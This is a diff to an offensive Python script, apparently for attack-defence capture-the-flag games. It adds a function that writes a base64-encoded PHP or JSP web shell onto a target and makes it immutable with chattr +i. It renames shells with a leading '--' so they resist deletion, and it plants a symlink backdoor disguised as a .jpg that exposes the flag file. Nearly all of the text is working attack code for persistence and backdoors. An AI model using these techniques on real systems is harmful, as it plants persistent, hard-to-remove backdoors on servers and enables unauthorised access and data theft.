@@ -101,9 +101,9 @@ def random_ua():
 
 def shell_hash(target,target_port):
 	if shell_type==1 or shell_type==2:
-		shell_name =  hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".php"
+		shell_name =  "--" + hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".php"
 	else:
-		shell_name =  hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".jsp"
+		shell_name = "--" + hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".jsp"
 
 	shell_arg = hashlib.md5(shell_salt_2 + target + ":" + target_port).hexdigest()
 	return shell_name,shell_arg
@@ -202,6 +202,10 @@ def generate_shell(target,target_port,cmd,shell_type=2):
 def get_shell(target,target_port,cmd):
 	shell_name,shell,encode_shell = generate_shell(target,target_port,cmd,shell_type)
 	return  "/bin/echo " + encode_shell + " | /usr/bin/base64 -d | /bin/cat > " + shell_absolute_path + "/" + shell_name 
+
+def get_shell_i(target,target_port,cmd):
+	shell_name,shell,encode_shell = generate_shell(target,target_port,cmd,shell_type)
+	return  "/bin/echo " + encode_shell + " | /usr/bin/base64 -d | /bin/cat > " + shell_absolute_path + "/" + shell_name + '; echo ' + shell_absolute_path + "/" + shell_name + '| xargs chattr +i'
 
 def get_flag(target,target_port,cmd):
 	return "/bin/cat " + flag_path
@@ -347,7 +351,8 @@ def rm_everything(target,target_port,cmd):
 	return cmd
 
 def ln_backdoor(target,target_port,cmd):
-	cmd = 'ln -s /home/ctf/flag %s'%ln_path
+	my_hash = hashlib.md5(shell_salt + target + ":" + target_port).hexdigest()[0:8]
+	cmd = 'ln -s %s %s/%s.jpg'%(flag_path,ln_path,my_hash)
 	debug_print(cmd)
 	return cmd
 
